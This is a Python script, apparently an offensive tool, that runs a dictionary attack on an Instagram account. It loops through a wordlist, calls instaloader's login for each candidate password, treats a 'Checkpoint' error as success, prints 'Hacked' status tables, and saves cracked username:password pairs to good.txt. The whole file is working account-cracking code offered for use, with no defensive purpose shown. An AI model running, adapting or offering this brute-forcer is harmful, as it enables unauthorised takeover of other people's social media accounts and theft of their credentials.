import instaloader
import typer
import requests
import os
from tabulate import tabulate
import time



def insta_dict(username, wordlist):
  spam_bool = 1
  c_spam = 0

  try:
      wl_file = open("wordlist/"+wordlist, 'r')
      wl_lines = [line.strip() for line in wl_file.readlines()]  # Rimuovi i caratteri di nuova riga
      count = 0
      with typer.progressbar(range(10)) as sp:
        for i in sp:
            time.sleep(0.1)     
  except FileNotFoundError:
      typer.secho(" The tool was arrested exit ",style=typer.colors.RED) 

  rs = requests.session()
  for line in wl_lines:
      password = line
      if insta_pass(username, line) == True:
        pass_table=[
            [typer.style(username,fg=typer.colors.GREEN),typer.style(password,fg=typer.colors.GREEN),typer.style("Hacked. Password is Helper/good.txt",fg=typer.colors.CYAN)]
        ]
        print(tabulate(pass_table,tablefmt="psql"))
                
        with open('good.txt', 'a') as x:
            x.write(username + ':' + password + '\n')
        exit()

      elif insta_pass(username, line) == False:
        x_table = [
            [typer.style(username,fg=typer.colors.GREEN),typer.style(password,fg=typer.colors.GREEN),typer.style("Hacking... Status: False",fg=typer.colors.RED)]
        ]
        print(tabulate(x_table,tablefmt="psql")) 

        
def insta_pass(USER, PASSWORD):
  L = instaloader.Instaloader()
  try:
    L.login(USER, PASSWORD)
    return 1
  except Exception as e:
    if "Checkpoint" in str(e):
      return 1
    elif "incorrect" in str(e):
      return 0
    elif "blocked" in str(e):
      return 0
    else:
      return 0
    